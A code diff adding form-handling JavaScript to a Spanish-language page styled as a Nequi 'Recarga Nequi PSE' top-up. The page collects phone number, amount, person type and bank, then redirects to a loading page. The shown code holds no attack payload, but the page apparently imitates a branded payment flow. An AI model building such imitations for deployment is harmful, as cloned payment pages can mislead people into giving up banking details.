+            const phone = phoneInput.value;
+            const confirmPhone = confirmPhoneInput.value;
+            
+            if (confirmPhone.length === 10 && phone !== confirmPhone) {
+                confirmPhoneInput.classList.add('error');
+                phoneError.textContent = '¡Ups! Esos dos números no coinciden, porfa revisalos.';
+                phoneError.style.display = 'block';
+                return false;
+            }
+            
+            confirmPhoneInput.classList.remove('error');
+            phoneError.textContent = '';
+            phoneError.style.display = 'none';
+            return true;
+        }
+
+        function handleAmountInput() {
+            amountInput.addEventListener('input', function() {
+                const value = this.value.replace(/[^0-9]/g, '');
+                
+                // Formatear con separador de miles
+                this.value = value ? `$${value.replace(/\B(?=(\d{3})+(?!\d))/g, '.')}` : '';
+                
+                toggleLabel(this);
+                validateAmount();
+                checkFormCompletion();
+            });
+            
+            amountInput.addEventListener('blur', validateAmount);
+        }
+
+        function validateAmount() {
+            const rawValue = amountInput.value.replace(/[^0-9]/g, '');
+            const numValue = parseInt(rawValue) || 0;
+            const hasError = amountInput.value && numValue === 0;
+            
+            amountInput.classList.toggle('error', hasError);
+            amountError.textContent = hasError ? 'Debes ingresar mín. [$1]' : '';
+            amountError.style.display = hasError ? 'block' : 'none';
+            
+            return !hasError;
+        }
+
+        function toggleLabel(input) {
+            const wrapper = input.closest('.input-wrapper, .select-wrapper');
+            if (!wrapper) return;
+            
+            const label = wrapper.querySelector('.input-label, .select-label');
+            const placeholder = wrapper.querySelector('.select-placeholder');
+            const staticLabel = wrapper.querySelector('.select-label-static');
+            const hasValue = input.value && input.value !== '';
+            
+            // Labels flotantes estándar
+            if (label) {
+                label.classList.toggle('active', hasValue);
+                input.classList.toggle('has-value', hasValue);
+            }
+            
+            // Labels de selectores
+            if (placeholder && staticLabel) {
+                placeholder.classList.toggle('hidden', hasValue);
+                staticLabel.style.display = hasValue ? 'block' : 'none';
+                input.style.paddingTop = hasValue ? '24px' : '16px';
+                input.style.paddingBottom = hasValue ? '8px' : '16px';
+            }
+        }
+
+        function handleBankSelect() {
+            bankSelect.addEventListener('change', function() {
+                toggleLabel(this);
+                checkFormCompletion();
+            });
+        }
+
+        function handlePersonTypeSelect() {
+            personTypeSelect.addEventListener('change', function() {
+                toggleLabel(this);
+                checkFormCompletion();
+            });
+        }
+
+        function checkFormCompletion() {
+            const isPhoneValid = phoneInput.value.length === 10 && phoneInput.value.startsWith('3');
+            const isConfirmPhoneValid = confirmPhoneInput.value.length === 10 && confirmPhoneInput.value.startsWith('3');
+            const phonesMatch = phoneInput.value === confirmPhoneInput.value;
+            const amountValue = amountInput.value.replace(/[^0-9]/g, '');
+            const isAmountValid = amountValue && parseInt(amountValue) > 0;
+            const isPersonTypeSelected = personTypeSelect.value !== '';
+            const isBankSelected = bankSelect.value !== '';
+            const isCheckboxChecked = checkbox.checked;
+            
+            const isFormComplete = isPhoneValid && 
+                                  isConfirmPhoneValid && 
+                                  phonesMatch && 
+                                  isAmountValid && 
+                                  isPersonTypeSelected && 
+                                  isBankSelected && 
+                                  isCheckboxChecked;
+            
+            submitBtn.disabled = !isFormComplete;
+            submitBtn.classList.toggle('enabled', isFormComplete);
+        }
+
+        function validateForm(e) {
+            e.preventDefault();
+            
+            let isValid = true;
+            
+            // Validar teléfono
+            if (!phoneInput.value || phoneInput.value.length !== 10 || !phoneInput.value.startsWith('3')) {
+                phoneInput.classList.add('error');
+                isValid = false;
+            }
+            
+            // Validar coincidencia de teléfonos
+            if (!validatePhoneMatch()) {
+                isValid = false;
+            }
+            
+            // Validar monto
+            if (!validateAmount()) {
+                isValid = false;
+            }
+            
+            // Validar banco
+            bankSelect.classList.toggle('error', !bankSelect.value);
+            if (!bankSelect.value) {
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Guardar datos en sessionStorage
+                sessionStorage.setItem('phone', phoneInput.value);
+                sessionStorage.setItem('amount', amountInput.value);
+                sessionStorage.setItem('personType', personTypeSelect.value);
+                sessionStorage.setItem('bank', bankSelect.value);
+                
+                showConfirmationPage();
+            }
+        }
+
+        function showConfirmationPage() {
+            const personTypeText = personTypeSelect.options[personTypeSelect.selectedIndex].text;
+            const bankText = bankSelect.options[bankSelect.selectedIndex].text;
+            
+            document.querySelector('.container').innerHTML = `
+                <div class="logo">
+                    <img src="img/nequi-logo.svg" alt="Nequi">
+                </div>
+                
+                <h1 class="confirmation-title">Revisa la info</h1>
+                
+                <div class="confirmation-box">
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">Concepto</div>
+                        <div class="confirmation-value">Recarga Nequi PSE</div>
+                    </div>
+                    
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">Número de celular</div>
+                        <div class="confirmation-value">${phoneInput.value}</div>
+                    </div>
+                    
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">¿Cuánto?</div>
+                        <div class="confirmation-value">${amountInput.value}</div>
+                    </div>
+                    
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">Tipo de persona</div>
+                        <div class="confirmation-value">${personTypeText}</div>
+                    </div>
+                    
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">Banco</div>
+                        <div class="confirmation-value">${bankText}</div>
+                    </div>
+                </div>
+                
+                <button type="button" class="btn-recargar" onclick="proceedToLoading()">Continuar</button>
+                <button type="button" class="btn-atras" onclick="location.reload()">Atrás</button>
+            `;
+        }
+
+        function proceedToLoading() {
+            // Obtener datos almacenados
+            const phone = sessionStorage.getItem('phone');
+            const amount = sessionStorage.getItem('amount');
+            const personType = sessionStorage.getItem('personType');
+            const bank = sessionStorage.getItem('bank');
+            
+            // Crear objeto con todos los datos
+            const formData = {
+                phone,
+                amount,
+                personType,
+                bank,
+                timestamp: new Date().toISOString()
+            };
+
+            // Guardar en sessionStorage
+            sessionStorage.setItem('formData', JSON.stringify(formData));
+
+            // Redirigir a loading
+            window.location.href = 'loading.html';
+        }
+
+        function setupSelectArrowAnimation() {
+            const selects = document.querySelectorAll('.select-wrapper select');
+            
+            selects.forEach(select => {
+                select.addEventListener('mousedown', function() {
+                    const arrow = this.nextElementSibling;
+                    if (arrow?.classList.contains('select-arrow')) {
+                        arrow.style.transform = 'translateY(-50%) rotate(180deg)';
+                    }
+                });
+                
+                select.addEventListener('change', function() {
+                    const arrow = this.nextElementSibling;
+                    if (arrow?.classList.contains('select-arrow')) {
+                        setTimeout(() => {
+                            arrow.style.transform = 'translateY(-50%) rotate(0deg)';
+                        }, 150);
+                    }
+                });
+                
+                select.addEventListener('blur', function() {
+                    const arrow = this.nextElementSibling;
+                    if (arrow?.classList.contains('select-arrow')) {
+                        arrow.style.transform = 'translateY(-50%) rotate(0deg)';
+                    }
+                });
+            });
+        }
     </script>
 </body>
 </html>
